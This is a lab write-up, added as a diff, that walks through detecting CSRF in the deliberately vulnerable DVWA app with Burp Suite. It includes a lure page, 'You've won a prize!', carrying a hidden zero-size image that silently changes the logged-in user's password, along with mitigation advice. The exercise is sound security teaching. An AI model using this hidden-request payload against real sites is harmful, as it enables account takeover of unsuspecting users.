@@ -1,0 +1,136 @@
+Aim: Detecting CSRF Vulnerabilities in web application. Detect CSRF attack using Burp Suite
+
+Requirements: 
+Kali Linux .
+
+Docker (docker.io) installed.
+
+Burp Suite (Community or Professional).
+
+Web browser (Burp's embedded browser recommended for interception).
+
+Python 3 
+
+DVWA Docker image: citizenstig/dvwa.
+
+
+
+Theory: 
+A. CSRF (Cross-Site Request Forgery)
+
+Attack where an authenticated user’s browser is tricked into sending a request (with their cookies/session) to a target site, causing an unauthorized action.
+Exploits trust the site places in the user’s browser (session cookies are automatically sent).
+
+B. Common CSRF primitives
+
+1. Image src, hidden <form> auto-submission, JavaScript fetch (if allowed), or GET/POST submission from an attack page.
+
+2. GET should be idempotent — using GET for state-changing actions increases CSRF risk.
+
+C. Detection / Testing with Burp Suite
+
+1. Intercept a legitimate request to see parameters, method, and lack of anti-CSRF token.
+
+2. Reproduce the request from an external page (or Burp Repeater) to verify that a forged request succeeds when issued with victim’s session.
+
+D. Mitigations (best practices)
+
+1. CSRF tokens: Unique, unpredictable token per session/request included in forms and validated server-side.
+
+2. SameSite cookie attribute: SameSite=Strict/Lax to prevent cookies being sent on cross-site requests (Lax allows some GET navigation).
+
+3. Validate Origin/Referer headers: Accept only requests from allowed origins (use Origin for POST/unsafe methods).
+
+
+
+
+Steps to perform:
+
+open kali, open terminal
+
+To install DVWA using Docker
+sudo apt update && sudo apt install docker.io -y
+
+-> Pull the official DVWA Docker image:
+sudo docker pull citizenstig/dvwa
+
+-> Run the DVWA container, mapping port 8080 to container’s port 80:
+sudo docker run -d -p 8080:80 citizenstig/dvwa
+
+-> Open your browser and go to http://localhost:8080.
+
+-> Log in with username admin and password password.
+
+-> On the DVWA home page, click on "Create/Reset database" to initialize the environment.
+
+
+First, we will create the malicious webpage that the "victim" will visit.
+1. Open a new Kali terminal.
+2. Paste the following multi-line command into your terminal to create the csrf-attack.html file on your Desktop. This file contains the hidden attack.
+
+cat << EOF > ~/Desktop/csrf-attack.html
+<html>
+  <body>
+    <img src="http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0" border="0">
+
+    <h1>You've won a prize! Click here!</h1>
+  </body>
+</html>
+EOF
+
+
+3. With the file created, use the same terminal to start a simple web server on your Desktop. This will host your malicious page.
+
+# Change directory to the Desktop
+cd ~/Desktop
+
+4. # Start the web server on port 9000
+python3 -m http.server 9000
+
+
+Leave this terminal running. It is now your "attacker" server.
+
+Phase 2: Set Up DVWA and Capture a Request
+
+Next, we will use Burp Suite to see what a normal password-change request looks like.
+Open a new terminal and start Burp Suite:
+
+burpsuite
+
+
+1. In Burp, select "Temporary project" -> Next -> "Start Burp".
+2. Go to the Proxy tab, then the Intercept sub-tab.
+3. Click the "Open Browser" button. A new browser will open.
+4. In this new Burp browser, go to http://localhost:8080 and log in to DVWA (Username: admin, Password: password).
+5. In DVWA, click "DVWA Security" on the left menu, set the level to low, and click Submit.
+6. Click "CSRF" on the left menu.
+7. Now, go back to Burp Suite and click "Intercept is off" so it changes to "Intercept is on".
+8. Go back to the Burp browser on the CSRF page:
+9. Type pass1 in the "New password" field.
+10. Type pass1 in the "Confirm new password" field.
+11. Click the Change button.
+12. Go back to Burp Suite. You will see the captured request. This shows you how the application changes a password—using a simple GET request with no unique token.
+13. right click on the request tab n copy url
+14. Click the "Forward" button to let the request go through.
+15. Click the "Intercept is on" button to set it back to "Intercept is off". Your DVWA password is now pass1.
+
+Phase 3: Execute and Verify the Attack
+
+Now, you will act as the "victim" who is logged into DVWA and stumbles upon the attacker's page.
+1. In the Burp Browser (where you are still logged in with the password pass1), open a new tab.
+Visit the malicious webpage being hosted by your Python server:
+http://localhost:9000/csrf-attack.html
+
+
+The page will load, showing "You've won a prize!". The attack has already happened in the background.
+2. Go back to your DVWA tab 
+3. On the left menu, click Logout.
+4. Verify the Attack:
+-->Try to log in with the password pass1. It will fail.
+-->Try to log in with the password hacked. It will succeed.
+This confirms the attack was successful. The malicious page used your active login session to forge a request and change your password.
+
+
+Conclusion
+
+This lab demonstrates a classic CSRF vulnerability: because DVWA (Low) performed a state-changing action (password change) via a request that lacked any per-request secret, an attacker-hosted page could silently trigger that request while the victim was logged in. Using Burp Suite to capture and inspect the legitimate request reveals the missing CSRF protection and allows reproduction of the exploit. The key takeaway: never trust automatic browser-sent credentials alone for sensitive actions — implement token-based defenses (CSRF tokens, SameSite cookies, origin checks) and ensure state-changing operations are protected and use appropriate HTTP methods.
